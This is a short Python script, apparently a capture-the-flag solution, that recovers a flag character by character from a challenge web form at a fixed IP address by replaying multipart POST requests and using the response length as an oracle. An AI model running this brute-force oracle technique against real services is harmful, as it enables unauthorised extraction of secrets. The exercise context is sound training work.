import requests

url1 = "http://141.85.224.118:8084/trial.html"
url2 = "http://141.85.224.118:8084/churn.php"

headers = {
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Content-Type": "multipart/form-data; boundary=---------------------------37279718952898749022936173824",
        "Upgrade-Insecure-Requests": "1"
}

body = f"-----------------------------37279718952898749022936173824\r\nContent-Disposition: form-data; name=\"txt_input\"\r\n\r\n\r\n-----------------------------37279718952898749022936173824\r\nContent-Disposition: form-data; name=\"submit\"\r\n\r\nSend\r\n-----------------------------37279718952898749022936173824\r\nContent-Disposition: form-data; name=\"flag\"\r\n\r\n{}\r\n-----------------------------37279718952898749022936173824--\r\n"

def initialize_session():
    a = requests.session()
    a.post(url1)
    return a

def send_found_string(session, foundstr):
    flagstr = ""
    for i in foundstr:
        flagstr += i
        req = session.post(url2, headers = headers, data = 
            f"-----------------------------37279718952898749022936173824\r\nContent-Disposition: form-data; name=\"txt_input\"\r\n\r\n\r\n-----------------------------37279718952898749022936173824\r\nContent-Disposition: form-data; name=\"submit\"\r\n\r\nSend\r\n-----------------------------37279718952898749022936173824\r\nContent-Disposition: form-data; name=\"flag\"\r\n\r\n{flagstr}\r\n-----------------------------37279718952898749022936173824--\r\n"
        )
        print(len(req.text))
    return session


def find_next_char(foundstr, mycharset):
    found = 0
    for i in mycharset:
        a = initialize_session()
        send_found_string(a, foundstr)
        flagstr = foundstr
        flagstr += i
        req = a.post(url2, headers = headers, data = 
            f"-----------------------------37279718952898749022936173824\r\nContent-Disposition: form-data; name=\"txt_input\"\r\n\r\n\r\n-----------------------------37279718952898749022936173824\r\nContent-Disposition: form-data; name=\"submit\"\r\n\r\nSend\r\n-----------------------------37279718952898749022936173824\r\nContent-Disposition: form-data; name=\"flag\"\r\n\r\n{flagstr}\r\n-----------------------------37279718952898749022936173824--\r\n"
        )
        if len(req.text) == 124:
            print(req.text)
            print(flagstr)
            foundstr = flagstr
            return foundstr
    print("ERROR")




str2="ABCDEFGHIJKLMNOPQRSTUVWXYZ"
mycharset=str2

foundstr="SSS{why_is_all_t"
find_next_char(foundstr, mycharset)
